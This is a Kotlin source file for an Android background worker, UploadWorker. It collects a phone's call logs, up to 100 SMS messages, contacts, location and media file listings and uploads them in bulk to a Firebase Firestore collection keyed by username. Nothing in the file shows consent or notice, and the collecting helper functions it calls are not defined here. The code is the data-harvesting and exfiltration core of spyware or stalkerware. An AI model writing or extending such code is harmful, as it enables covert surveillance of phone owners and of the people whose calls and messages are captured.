package com.example.myapplication3

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.firebase.firestore.FirebaseFirestore

class UploadWorker(context: Context, params: WorkerParameters) : Worker(context, params) {

    // Function to get the username from SharedPreferences
    private fun getUsername(context: Context): String {
        val sharedPreferences = context.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        val username = sharedPreferences.getString("user_name", "default_user") ?: "default_user"
        return username
    }

    override fun doWork(): Result {
        try {
            val callLogs = getCallLogs(applicationContext)
            val smsLogs = getSMSLogs(applicationContext, limit = 100) // Limit SMS logs to 100
            val contacts = getContacts(applicationContext)
            val location = getLocation(applicationContext)
            val mediaFiles = getMediaFiles(applicationContext)

            // Get the username from SharedPreferences
            val username = getUsername(applicationContext)

            // Log the retrieved username
            Log.d("UploadWorker", "Retrieved username: $username")

            // Upload data to Firebase with the username as the collection path
            uploadDataToFirebase(username, callLogs.toString(), smsLogs.toString(), contacts.toString(), location.toString(), mediaFiles)

            return Result.success()
        } catch (e: Exception) {
            Log.e("UploadWorker", "Error uploading data", e)
            return Result.failure()
        }
    }

    private fun uploadDataToFirebase(username: String, callLogs: String, smsLogs: String, contacts: String, location: String, mediaFiles: List<Map<String, String>>) {
        val db = FirebaseFirestore.getInstance()

        val data = hashMapOf(
            "callLogs" to callLogs,
            "smsLogs" to smsLogs,  // Subset of SMS logs
            "contacts" to contacts,
            "location" to location,
            "mediaFiles" to mediaFiles
        )

        // Upload to the user's collection path based on their username
        db.collection("user_data")
            .document(username)  // The document path will be the username
            .set(data)  // Use .set() to update or create the document with the username as ID
            .addOnSuccessListener {
                Log.d("UploadWorker", "Data uploaded successfully for username: $username")
            }
            .addOnFailureListener { e ->
                Log.w("UploadWorker", "Error uploading data for username: $username", e)
            }
    }
}
